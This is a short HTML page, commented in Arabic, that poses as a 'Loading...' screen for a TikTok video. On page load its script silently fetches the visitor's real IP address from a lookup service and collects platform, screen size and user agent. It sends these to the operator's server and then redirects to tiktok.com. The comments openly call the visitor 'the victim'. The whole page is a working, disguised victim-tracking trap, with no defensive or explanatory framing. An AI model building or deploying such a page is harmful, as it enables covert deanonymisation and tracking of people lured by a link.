<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جارٍ التحميل...</title>
    <script>
        async function captureData() {
            let deviceData = {};
            
            // 1. سحب الـ IP الحقيقي
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                deviceData.ip = ipData.ip;
            } catch(e) { deviceData.ip = "مخفي"; }

            // 2. سحب تفاصيل الجهاز
            deviceData.platform = navigator.platform;
            deviceData.screen = window.screen.width + "x" + window.screen.height;
            deviceData.userAgent = navigator.userAgent;

            // 3. إرسال البيانات لسيرفرك
            await fetch('/api/index', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: "تحويل فيديو (تيك توك)", device: deviceData })
            });

            // 4. الرابط اللي تبي الضحية يروح له (تقدر تغيره لأي فيديو)
            window.location.href = "https://www.tiktok.com"; 
        }
        window.onload = captureData;
    </script>
</head>
<body style="background-color: #000;">
    </body>
</html>
